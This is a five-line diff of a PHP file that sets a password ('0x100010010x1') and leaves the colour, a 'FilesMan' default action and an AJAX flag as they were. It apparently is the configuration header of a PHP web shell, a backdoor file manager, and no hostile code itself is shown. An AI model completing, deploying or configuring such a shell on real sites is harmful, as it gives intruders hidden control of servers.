@@ -1,5 +1,5 @@
 <?php
-$auth_pass = "";
+$auth_pass = "0x100010010x1";
 $color = "#e6fab4";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
